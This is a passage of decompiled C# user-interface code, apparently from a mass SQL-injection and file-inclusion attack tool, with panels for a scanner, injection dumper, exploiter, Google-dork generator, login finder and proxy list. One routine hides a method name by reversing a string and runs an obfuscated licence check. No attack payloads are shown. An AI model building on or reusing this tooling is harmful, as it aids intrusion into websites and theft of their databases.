				treeNode_6.Text = text;
			}
			text = method_66(Globals.G_SOCKS.method_9());
			text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 6) + " " + text;
			if (bool_3)
			{
				if (!text.Equals(mdiTabControl.TabPages[3].Text))
				{
					mdiTabControl.TabPages[3].Text = text;
				}
			}
			else if (!text.Equals(treeNode_7.Text))
			{
				treeNode_7.Text = text;
			}
			text = Globals.FormatNumbers(Globals.G_SOCKS.method_10());
			if (!text.Equals(lblSocksCount.Text))
			{
				lblSocksCount.Text = text;
			}
			if (twMain.SelectedNode != null)
			{
				text = ((!pnlTree.Visible) ? (Globals.APP_VERSION + " [" + twMain.SelectedNode.Text.ToUpper() + "]") : Globals.APP_VERSION);
				if (!Text.Equals(text))
				{
					Text = text;
				}
			}
		}
		if (!Boolean_1)
		{
			return;
		}
		if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken2 = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init, ref lockTaken2);
			if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init.State == 0)
			{
				_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init.State = 2;
				_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks = 1;
			}
			else if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init.State = 1;
			if (lockTaken2)
			{
				Monitor.Exit(_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init);
			}
		}
		if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called)
		{
			return;
		}
		int num;
		checked
		{
			_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks++;
			Random random = new Random();
			num = random.Next(180, 600);
		}
		if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks % num == 0)
		{
			char[] array2 = "7_DOHTEMS".ToCharArray();
			Array.Reverse(array2);
			string text2 = new string(array2);
			string text3 = Conversions.ToString(Versioned.CallByName(this, text2.ToLower(), CallType.Method, 0));
			if ((string.IsNullOrEmpty(text3) || !text3.ToLower().Contains("uclng")) | (Globals.G_DataGP == null))
			{
				Globals.DG_SQLi = null;
				Globals.DG_SQLiNoInjectable = null;
				Globals.DG_FileInclusao = null;
			}
			else
			{
				_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called = true;
			}
		}
	}

	private static double smethod_11(double[] double_0)
	{
		double num = 0.0;
		double result = 0.0;
		checked
		{
			int num2 = double_0.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				num += double_0[i];
			}
			if (double_0.Length > 0)
			{
				result = num / Convert.ToDouble(double_0.Length);
			}
			return result;
		}
	}

	private void method_53(object sender, TreeNodeMouseClickEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			twMain.SelectedNode = e.Node;
		}
	}

	private void method_54(object object_0, object object_1)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (mdiTabControl == null)
					{
						goto end_IL_0001;
					}
					goto IL_0012;
				case 601:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001_2;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0022;
						case 24:
							goto IL_0033;
						case 6:
							goto IL_0047;
						case 7:
							goto IL_0055;
						case 8:
							goto IL_0063;
						case 9:
							goto IL_006b;
						case 10:
							goto IL_007e;
						case 11:
							goto IL_009e;
						case 12:
							goto IL_00ad;
						case 14:
							goto IL_00c1;
						case 15:
							goto IL_00e6;
						case 16:
							goto IL_0106;
						case 17:
							goto IL_011c;
						case 18:
							goto IL_0135;
						case 19:
							goto IL_014e;
						case 20:
							goto IL_015d;
						case 13:
						case 21:
						case 22:
							goto IL_016c;
						case 5:
						case 23:
						case 25:
						case 26:
						case 27:
							goto IL_0180;
						case 28:
							goto IL_01b0;
						case 30:
							goto end_IL_0001_3;
						default:
							goto end_IL_0001_2;
						case 2:
						case 29:
						case 31:
						case 32:
							goto end_IL_0001;
						}
						goto default;
					}
					IL_016c:
					num = 22;
					numThreads.Tag = true;
					goto IL_0180;
					IL_0180:
					num = 27;
					if (mdiTabControl.SelectedIndex() != 5 || uxTabControl_1.SelectedIndex != checked(uxTabControl_1.TabCount - 1))
					{
						break;
					}
					goto IL_01b0;
					IL_015d:
					num = 20;
					toolStripLabel_1.Visible = true;
					goto IL_016c;
					IL_01b0:
					num = 28;
					method_67();
					goto end_IL_0001;
					IL_0012:
					num = 3;
					if (enum6_0 == Enum6.const_0)
					{
						goto IL_0022;
					}
					goto IL_0180;
					IL_0022:
					num = 4;
					if (mdiTabControl.SelectedIndex() != 0)
					{
						goto IL_0033;
					}
					goto IL_0047;
					IL_0033:
					num = 24;
					tsWorker.Visible = false;
					goto IL_0180;
					IL_0047:
					num = 6;
					tsWorker.Visible = true;
					goto IL_0055;
					IL_0055:
					num = 7;
					numThreads.Tag = null;
					goto IL_0063;
					IL_0063:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_006b;
					IL_006b:
					num = 9;
					if (uxTabControl_0.SelectedIndex == 0)
					{
						goto IL_007e;
					}
					goto IL_00c1;
					IL_007e:
					num = 10;
					btnStart.Text = Globals.translate_0.GetStr(this, 109);
					goto IL_009e;
					IL_009e:
					num = 11;
					numThreads.Visible = false;
					goto IL_00ad;
					IL_00ad:
					num = 12;
					toolStripLabel_1.Visible = false;
					goto IL_016c;
					IL_00c1:
					num = 14;
					if ((uxTabControl_0.SelectedIndex == 1) | (uxTabControl_0.SelectedIndex == 2))
					{
						goto IL_00e6;
					}
					goto IL_016c;
					IL_00e6:
					num = 15;
					btnStart.Text = Globals.translate_0.GetStr(this, 110);
					goto IL_0106;
					IL_0106:
					num = 16;
					numThreads.Increment = 10m;
					goto IL_011c;
					IL_011c:
					num = 17;
					numThreads.Maximum = 300m;
					goto IL_0135;
					IL_0135:
					num = 18;
					numThreads.Value = new decimal(int_2);
					goto IL_014e;
					IL_014e:
					num = 19;
					numThreads.Visible = true;
					goto IL_015d;
					end_IL_0001_3:
					break;
				}
				num = 30;
				method_68();
				break;
				end_IL_0001_2:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 601;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void uxTabControl_0_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (uxTabControl_0.SelectedIndex)
		{
		case 0:
			dtgQueue.Focus();
			break;
		case 1:
			dtgSQLi.Focus();
			break;
		case 2:
			dtgFileInclusao.Focus();
			break;
		case 3:
			dtgSQLiNoInjectable.Focus();
			break;
		case 4:
			dtgTrash.Focus();
			break;
		}
		method_54(null, null);
	}

	private void uxTabControl_1_SelectedIndexChanged(object sender, EventArgs e)
	{
		method_54(null, null);
	}

	private void smethod_6(object sender, TreeViewEventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string left = default(string);
		string left2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (bool_3)
					{
						goto IL_000c;
					}
					goto IL_001b;
				case 2101:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000c;
						case 4:
						case 5:
							goto IL_001b;
						case 6:
							goto IL_002e;
						case 8:
						case 9:
							goto IL_0045;
						case 10:
							goto IL_0050;
						case 11:
						case 12:
							goto IL_0067;
						case 13:
							goto IL_0076;
						case 14:
							goto IL_0085;
						case 15:
							goto IL_0094;
						case 16:
							goto IL_00a3;
						case 17:
							goto IL_00b2;
						case 18:
							goto IL_00c1;
						case 19:
							goto IL_00d0;
						case 20:
							goto IL_00df;
						case 21:
							goto IL_00ee;
						case 22:
							goto IL_00fd;
						case 23:
							goto IL_010c;
						case 24:
							goto IL_011b;
						case 25:
							goto IL_012a;
						case 26:
							goto IL_0139;
						case 27:
							goto IL_0148;
						case 28:
							goto IL_0157;
						case 30:
							goto IL_0166;
						case 31:
							goto IL_0180;
						case 33:
							goto IL_0194;
						case 34:
							goto IL_01ae;
						case 36:
							goto IL_01c2;
						case 37:
							goto IL_01dc;
						case 39:
							goto IL_01f0;
						case 40:
							goto IL_020a;
						case 42:
							goto IL_021e;
						case 43:
							goto IL_0238;
						case 45:
							goto IL_024c;
						case 46:
							goto IL_0266;
						case 48:
							goto IL_027a;
						case 49:
							goto IL_0294;
						case 51:
							goto IL_02a8;
						case 52:
							goto IL_02c2;
						case 54:
							goto IL_02d6;
						case 55:
							goto IL_02f0;
						case 57:
							goto IL_0304;
						case 58:
							goto IL_031e;
						case 60:
							goto IL_0332;
						case 61:
							goto IL_034c;
						case 63:
							goto IL_0360;
						case 64:
							goto IL_037a;
						case 66:
							goto IL_038e;
						case 67:
							goto IL_03a8;
						case 69:
							goto IL_03bc;
						case 70:
							goto IL_03d6;
						case 72:
							goto IL_03e7;
						case 73:
							goto IL_0401;
						case 75:
							goto IL_0412;
						case 76:
							goto IL_042c;
						case 78:
							goto IL_043d;
						case 29:
						case 32:
						case 35:
						case 38:
						case 41:
						case 44:
						case 47:
						case 50:
						case 53:
						case 56:
						case 59:
						case 62:
						case 65:
						case 68:
						case 71:
						case 74:
						case 77:
						case 79:
							goto IL_044d;
						case 80:
							goto IL_046d;
						case 82:
							goto IL_0478;
						case 81:
						case 83:
						case 84:
							goto IL_0481;
						case 85:
							goto IL_0492;
						case 87:
							goto IL_04a1;
						case 88:
							goto IL_04e9;
						case 89:
							goto IL_04f8;
						case 90:
							goto IL_0507;
						case 91:
							goto IL_050f;
						case 92:
							goto IL_052f;
						case 93:
							goto IL_054f;
						case 94:
							goto IL_055e;
						case 96:
							goto IL_0572;
						case 97:
							goto IL_05b1;
						case 98:
							goto IL_05d1;
						case 99:
							goto IL_05e7;
						case 100:
							goto IL_0600;
						case 101:
							goto IL_0619;
						case 102:
							goto IL_0628;
						case 95:
						case 103:
						case 104:
							goto IL_0637;
						case 106:
							goto IL_064d;
						case 86:
						case 105:
						case 107:
						case 108:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
						case 7:
						case 109:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_05e7:
					num = 99;
					numThreads.Maximum = 300m;
					goto IL_0600;
					IL_0600:
					num = 100;
					numThreads.Value = new decimal(int_2);
					goto IL_0619;
					IL_05d1:
					num = 98;
					numThreads.Increment = 10m;
					goto IL_05e7;
					IL_0619:
					num = 101;
					numThreads.Visible = true;
					goto IL_0628;
					IL_000c:
					num = 2;
					method_54(null, null);
					goto end_IL_0001_3;
					IL_001b:
					num = 5;
					Globals.LockWindowUpdate(pnlWindows.Handle);
					goto IL_002e;
					IL_002e:
					num = 6;
					if (Information.IsNothing(twMain.SelectedNode))
					{
						goto end_IL_0001_3;
					}
					goto IL_0045;
					IL_0045:
					num = 9;
					if (Information.IsNothing(e))
					{
						goto IL_0050;
					}
					goto IL_0067;
					IL_0050:
					num = 10;
					e = new TreeViewEventArgs(twMain.SelectedNode);
					goto IL_0067;
					IL_0067:
					num = 12;
					pnlScanner.Visible = false;
					goto IL_0076;
					IL_0076:
					num = 13;
					pnlSQLi.Visible = false;
					goto IL_0085;
					IL_0085:
					num = 14;
					pnlSQLiNoInjectable.Visible = false;
					goto IL_0094;
					IL_0094:
					num = 15;
					pnlSQLiDumper.Visible = false;
					goto IL_00a3;
					IL_00a3:
					num = 16;
					pnlExploiter.Visible = false;
					goto IL_00b2;
					IL_00b2:
					num = 17;
					pnlAnalizer.Visible = false;
					goto IL_00c1;
					IL_00c1:
					num = 18;
					pnlTrash.Visible = false;
					goto IL_00d0;
					IL_00d0:
					num = 19;
					pnlSockList.Visible = false;
					goto IL_00df;
					IL_00df:
					num = 20;
					pnlTools.Visible = false;
					goto IL_00ee;
					IL_00ee:
					num = 21;
					pnlDorkGenerator.Visible = false;
					goto IL_00fd;
					IL_00fd:
					num = 22;
					pnlLoginFinder.Visible = false;
					goto IL_010c;
					IL_010c:
					num = 23;
					pnlNotepad.Visible = false;
					goto IL_011b;
					IL_011b:
					num = 24;
					pnlSettings.Visible = false;
					goto IL_012a;
					IL_012a:
					num = 25;
					pnlSettingsAdvanced.Visible = false;
					goto IL_0139;
					IL_0139:
					num = 26;
					pnlStatistics.Visible = false;
					goto IL_0148;
					IL_0148:
					num = 27;
					pnlAbout.Visible = false;
					goto IL_0157;
					IL_0157:
					num = 28;
					left = e.Node.Text;
					goto IL_0166;
					IL_0166:
					num = 30;
					if (Operators.CompareString(left, treeNode_0.Text, TextCompare: false) == 0)
					{
						goto IL_0180;
					}
					goto IL_0194;
					IL_0180:
					num = 31;
					pnlScanner.Visible = true;
					goto IL_044d;
					IL_0194:
					num = 33;
					if (Operators.CompareString(left, treeNode_9.Text, TextCompare: false) == 0)
					{
						goto IL_01ae;
					}
					goto IL_01c2;
					IL_01ae:
					num = 34;
					pnlDorkGenerator.Visible = true;
					goto IL_044d;
					IL_01c2:
					num = 36;
					if (Operators.CompareString(left, treeNode_1.Text, TextCompare: false) == 0)
					{
						goto IL_01dc;
					}
					goto IL_01f0;
					IL_01dc:
					num = 37;
					pnlSQLi.Visible = true;
					goto IL_044d;
					IL_01f0:
					num = 39;
					if (Operators.CompareString(left, treeNode_2.Text, TextCompare: false) == 0)
					{
						goto IL_020a;
					}
					goto IL_021e;
					IL_020a:
					num = 40;
					pnlSQLiNoInjectable.Visible = true;
					goto IL_044d;
					IL_021e:
					num = 42;
					if (Operators.CompareString(left, treeNode_3.Text, TextCompare: false) == 0)
					{
						goto IL_0238;
					}
					goto IL_024c;
					IL_0238:
					num = 43;
					pnlSQLiDumper.Visible = true;
					goto IL_044d;
					IL_024c:
					num = 45;
					if (Operators.CompareString(left, treeNode_4.Text, TextCompare: false) == 0)
					{
						goto IL_0266;
					}
					goto IL_027a;
					IL_0266:
					num = 46;
					pnlExploiter.Visible = true;
					goto IL_044d;
					IL_027a:
					num = 48;
					if (Operators.CompareString(left, treeNode_5.Text, TextCompare: false) == 0)
					{
						goto IL_0294;
					}
					goto IL_02a8;
					IL_0294:
					num = 49;
					pnlAnalizer.Visible = true;
					goto IL_044d;
					IL_02a8:
					num = 51;
					if (Operators.CompareString(left, treeNode_6.Text, TextCompare: false) == 0)
					{
						goto IL_02c2;
					}
					goto IL_02d6;
					IL_02c2:
					num = 52;
					pnlTrash.Visible = true;
					goto IL_044d;
					IL_02d6:
					num = 54;
					if (Operators.CompareString(left, treeNode_7.Text, TextCompare: false) == 0)
					{
						goto IL_02f0;
					}
					goto IL_0304;
					IL_02f0:
					num = 55;
					pnlSockList.Visible = true;
					goto IL_044d;
					IL_0304:
					num = 57;
					if (Operators.CompareString(left, treeNode_8.Text, TextCompare: false) == 0)
					{
						goto IL_031e;
					}
					goto IL_0332;
					IL_031e:
					num = 58;
					pnlTools.Visible = true;
					goto IL_044d;
					IL_0332:
					num = 60;
					if (Operators.CompareString(left, treeNode_10.Text, TextCompare: false) == 0)
					{
						goto IL_034c;
					}
					goto IL_0360;
					IL_034c:
					num = 61;
					pnlLoginFinder.Visible = true;
					goto IL_044d;
					IL_0360:
					num = 63;
					if (Operators.CompareString(left, treeNode_11.Text, TextCompare: false) == 0)
					{
						goto IL_037a;
					}
					goto IL_038e;
					IL_037a:
					num = 64;
					pnlNotepad.Visible = true;
					goto IL_044d;
					IL_038e:
					num = 66;
					if (Operators.CompareString(left, treeNode_12.Text, TextCompare: false) == 0)
					{
						goto IL_03a8;
					}
					goto IL_03bc;
					IL_03a8:
					num = 67;
					pnlSettings.Visible = true;
					goto IL_044d;
					IL_03bc:
					num = 69;
					if (Operators.CompareString(left, treeNode_13.Text, TextCompare: false) == 0)
					{
						goto IL_03d6;
					}
					goto IL_03e7;
					IL_03d6:
					num = 70;
					pnlSettingsAdvanced.Visible = true;
					goto IL_044d;
					IL_03e7:
					num = 72;
					if (Operators.CompareString(left, treeNode_14.Text, TextCompare: false) == 0)
					{
						goto IL_0401;
					}
					goto IL_0412;
					IL_0401:
					num = 73;
					pnlStatistics.Visible = true;
					goto IL_044d;
					IL_0412:
					num = 75;
					if (Operators.CompareString(left, treeNode_15.Text, TextCompare: false) == 0)
					{
						goto IL_042c;
					}
					goto IL_043d;
					IL_042c:
					num = 76;
					pnlAbout.Visible = true;
					goto IL_044d;
					IL_043d:
					num = 78;
					Interaction.MsgBox("twMain_AfterSelect");
					goto IL_044d;
					IL_044d:
					num = 79;
					if (e.Node.Text.Equals(treeNode_15.Text))
					{
						goto IL_046d;
					}
					goto IL_0478;
					IL_046d:
					num = 80;
					method_67();
					goto IL_0481;
					IL_0478:
					num = 82;
					method_68();
					goto IL_0481;
					IL_0481:
					num = 84;
					if (enum6_0 != 0)
					{
						break;
					}
					goto IL_0492;
					IL_0492:
					num = 85;
					left2 = e.Node.Text;
					goto IL_04a1;
					IL_04a1:
					num = 87;
					if (Operators.CompareString(left2, treeNode_0.Text, TextCompare: false) == 0 || Operators.CompareString(left2, treeNode_4.Text, TextCompare: false) == 0 || Operators.CompareString(left2, treeNode_1.Text, TextCompare: false) == 0)
					{
						goto IL_04e9;
					}
					goto IL_064d;
					IL_0628:
					num = 102;
					toolStripLabel_1.Visible = true;
					goto IL_0637;
					IL_0637:
					num = 104;
					numThreads.Tag = true;
					break;
					IL_064d:
					num = 106;
					tsWorker.Visible = false;
					break;
					IL_04e9:
					num = 88;
					tsWorker.Visible = true;
					goto IL_04f8;
					IL_04f8:
					num = 89;
					numThreads.Tag = null;
					goto IL_0507;
					IL_0507:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_050f;
					IL_050f:
					num = 91;
					if (e.Node.Text.Equals(treeNode_0.Text))
					{
						goto IL_052f;
					}
					goto IL_0572;
					IL_052f:
					num = 92;
					btnStart.Text = Globals.translate_0.GetStr(this, 109);
					goto IL_054f;
					IL_054f:
					num = 93;
					numThreads.Visible = false;
					goto IL_055e;
					IL_055e:
					num = 94;
					toolStripLabel_1.Visible = false;
					goto IL_0637;
					IL_0572:
					num = 96;
					if (e.Node.Text.Equals(treeNode_4.Text) | e.Node.Text.Equals(treeNode_1.Text))
					{
						goto IL_05b1;
					}
					goto IL_0637;
					IL_05b1:
					num = 97;
					btnStart.Text = Globals.translate_0.GetStr(this, 110);
					goto IL_05d1;
					end_IL_0001_2:
					break;
				}
				num = 108;
				Globals.LockWindowUpdate(IntPtr.Zero);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2101;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_55(TreeNode treeNode_16, int int_14)
	{
		treeNode_16.SelectedImageIndex = int_14;
		treeNode_16.ImageIndex = int_14;
	}

	private void method_56()
	{
		method_55(treeNode_0, 0);
		method_55(treeNode_9, 0);
		method_55(treeNode_1, 1);
		method_55(treeNode_2, 2);
		method_55(treeNode_3, 3);
		method_55(treeNode_4, 4);
		method_55(treeNode_5, 4);
		method_55(treeNode_6, 5);
		method_55(treeNode_7, 6);
		method_55(treeNode_8, 7);
		method_55(treeNode_10, 8);
		method_55(treeNode_11, 9);
		method_55(treeNode_12, 10);
		method_55(treeNode_13, 11);
		method_55(treeNode_14, 12);
		method_55(treeNode_15, 13);
		twMain.BeginUpdate();
		twMain.Nodes.Add(treeNode_0);
		twMain.Nodes.Add(treeNode_1);
		treeNode_1.Nodes.Add(treeNode_5);
		treeNode_1.Nodes.Add(treeNode_3);
		treeNode_1.Nodes.Add(treeNode_2);
		treeNode_1.ExpandAll();
		twMain.Nodes.Add(treeNode_4);
		treeNode_4.ExpandAll();
		twMain.Nodes.Add(treeNode_6);
		twMain.Nodes.Add(treeNode_7);
		twMain.Nodes.Add(treeNode_8);
		treeNode_8.Nodes.Add(treeNode_10);
		treeNode_8.Nodes.Add(treeNode_11);
		treeNode_8.Collapse();
		twMain.Nodes.Add(treeNode_12);
		treeNode_12.Nodes.Add(treeNode_13);
		treeNode_12.Nodes.Add(treeNode_14);
		treeNode_12.Nodes.Add(treeNode_15);
		treeNode_12.Collapse();
		twMain.ImageList = imlTree;
		twMain.EndUpdate();
	}

	private void method_57(Panel panel_0)
	{
		pnlControls.Controls.Add(panel_0);
		panel_0.Dock = DockStyle.Fill;
		panel_0.Visible = false;
		SetDoubleBuffered(panel_0);
	}

	internal void method_58(bool bool_5 = true)
	{
		pnlAnalizer.AutoScroll = true;
		AnalizerForm = new Analizer();
		AnalizerForm.FormBorderStyle = FormBorderStyle.None;
		AnalizerForm.TopLevel = false;
		pnlAnalizer.Controls.Add(AnalizerForm);
		AnalizerForm.Dock = DockStyle.Fill;
		if (bool_5)
		{
			AnalizerForm.LoadSettings();
		}
		AnalizerForm.Show();
	}

	internal void method_59(bool bool_5 = true)
	{
		pnlLoginFinder.AutoScroll = true;
		LoginFinderForm = new LoginFinder();
		LoginFinderForm.FormBorderStyle = FormBorderStyle.None;
		LoginFinderForm.TopLevel = false;
		pnlLoginFinder.Controls.Add(LoginFinderForm);
		LoginFinderForm.Dock = DockStyle.Fill;
		if (bool_5)
		{
			LoginFinderForm.LoadSettings();
		}
		LoginFinderForm.Show();
	}

	internal void method_60(bool bool_5 = false)
	{
		pnlSQLiDumper.AutoScroll = true;
		DumperForm = new Dumper();
		DumperForm.FormBorderStyle = FormBorderStyle.None;
		DumperForm.TopLevel = false;
		pnlSQLiDumper.Controls.Add(DumperForm);
		DumperForm.Dock = DockStyle.Fill;
		DumperForm.Show();
		if (!Globals.IS_DUMP_INSTANCE)
		{
			if (bool_5)
			{
				DumperForm.Focus();
			}
			else
			{
				DumperForm.method_75();
			}
			return;
		}
		pnlTree.Visible = false;
		toolStripButton_4.Checked = true;
		toolStripButton_4.Visible = false;
		pnlControls.Controls.Remove(pnlSockList);
		DumperForm.tpProxies.Controls.Add(pnlSockList);
		DumperForm.tpProxies.Text = Globals.translate_0.GetStr(this, 103);
		pnlSockList.Visible = true;
		string[] cOMMAND_LINE_ARGS = Globals.COMMAND_LINE_ARGS;
		DumperForm.Text = Class23.smethod_11(cOMMAND_LINE_ARGS[1]);
		DumperForm.txtURL.Text = cOMMAND_LINE_ARGS[1];
		DumperForm.cmbSqlType.SelectedItem = cOMMAND_LINE_ARGS[2];
		DumperForm.method_67(null, null);
		checked
		{
			if (cOMMAND_LINE_ARGS.Length > 2)
			{
				int num = cOMMAND_LINE_ARGS.Length - 1;
				for (int i = 3; i <= num; i++)
				{
					string[] array = Strings.Split(cOMMAND_LINE_ARGS[i], ".");
					if (array.Length == 2)
					{
						DumperForm.method_47(array[0]);
						DumperForm.method_48(array[0], array[1]);
					}
				}
			}
			Text = DumperForm.Text;
			if (DumperForm.trwSchema.Nodes.Count > 0)
			{
				DumperForm.trwSchema.SelectedNode = DumperForm.trwSchema.Nodes[0];
			}
			DumperForm.method_90(null, null);
		}
	}

	internal void method_61(bool bool_5 = true)
	{
		pnlAnalizer.Controls.Remove(AnalizerForm);
		if (bool_5)
		{
			AnalizerForm.SaveSettings();
		}
		AnalizerForm.Close();
		AnalizerForm.Dispose();
	}

	internal void method_62(bool bool_5 = true)
	{
		pnlLoginFinder.Controls.Remove(LoginFinderForm);
		if (bool_5)
		{
			LoginFinderForm.SaveSettings();
		}
		LoginFinderForm.Close();
		LoginFinderForm.Dispose();
	}

	internal void method_63(bool bool_5 = false)
	{
		pnlSQLiDumper.Controls.Remove(DumperForm);
		if (!bool_5)
		{
			DumperForm.Close();
		}
		DumperForm.Dispose();
	}

	public void smethod_8()
	{
		Globals.G_Taskbar = new Manager(base.Handle);
		stMain.SendToBack();
		cmbGuiStyle.Items.AddRange(new string[2] { "Tabs", "Tree" });
		cmbGuiStyle.Text = Class50.smethod_5(base.Name, cmbGuiStyle.Name, "Tabs");
		bool_3 = cmbGuiStyle.Text.Equals("Tabs");
		checked
		{
			if (Globals.IS_DUMP_INSTANCE)
			{
				SetDoubleBuffered(pnlSQLiDumper);
				SetDoubleBuffered(pnlSockList);
				pnlSockList.Dock = DockStyle.Fill;
				toolStripButton_4.Visible = false;
				tsWorker.Visible = false;
				bool_3 = false;
			}
			else
			{
				if (!bool_3)
				{
					treeNode_0 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 0));
					treeNode_9 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 16));
					treeNode_1 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 1));
					treeNode_2 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 2));
					treeNode_3 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 3));
					treeNode_4 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 4));
					treeNode_5 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 15));
					treeNode_6 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 5));
					treeNode_7 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 6));
					treeNode_8 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 7));
					treeNode_10 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 8));
					treeNode_11 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 9));
					treeNode_12 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 10));
					treeNode_13 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 11));
					treeNode_14 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 12));
					treeNode_15 = new TreeNode(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 13));
					if (Globals.translate_0.GetLanguage().Equals("English"))
					{
						pnlTree.Width = 200;
					}
					else
					{
						pnlTree.Width = 200;
					}
					SetDoubleBuffered(pnlWindows);
					pnlWindows.Dock = DockStyle.Fill;
					method_57(pnlScanner);
					method_57(pnlSQLi);
					method_57(pnlSQLiNoInjectable);
					method_57(pnlSQLiDumper);
					method_57(pnlExploiter);
					method_57(pnlAnalizer);
					method_57(pnlTrash);
					method_57(pnlSockList);
					method_57(pnlTools);
					method_57(pnlDorkGenerator);
					method_57(pnlLoginFinder);
					method_57(pnlNotepad);
					method_57(pnlSettings);
					method_57(pnlSettingsAdvanced);
					method_57(pnlStatistics);
					method_57(pnlAbout);
					method_56();
					MinimumSize = new Size(650, 450);
				}
				else
				{
					pnlTree.Visible = false;
					pnlScanner.Visible = false;
					pnlSQLi.Visible = false;
					pnlSQLiNoInjectable.Visible = false;
					pnlSQLiDumper.Visible = false;
					pnlExploiter.Visible = false;
					pnlAnalizer.Visible = false;
					pnlTrash.Visible = false;
					pnlSockList.Visible = false;
					pnlTools.Visible = false;
					pnlDorkGenerator.Visible = false;
					pnlLoginFinder.Visible = false;
					pnlNotepad.Visible = false;
					pnlSettings.Visible = false;
					pnlSettingsAdvanced.Visible = false;
					pnlStatistics.Visible = false;
					pnlAbout.Visible = false;
					pnlTree.Visible = false;
					pnlWindows.Visible = false;
					pnlControls.Visible = false;
					mdiTabControl = new TabControlExt();
					base.Controls.Add(mdiTabControl);
					mdiTabControl.Dock = DockStyle.Fill;
					mdiTabControl.SendToBack();
					SetDoubleBuffered(mdiTabControl);
					TabControlExt tabControlExt = mdiTabControl;
					toolStripButton_4.Visible = false;
					pnlScanner.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 0);
					pnlSQLi.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 1);
					pnlSQLiNoInjectable.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 2);
					pnlSQLiDumper.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 3);
					pnlExploiter.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 4);
					pnlAnalizer.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 15);
					pnlTrash.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 5);
					pnlSockList.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 6);
					pnlTools.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 7);
					pnlDorkGenerator.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 16);
					pnlLoginFinder.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 8);
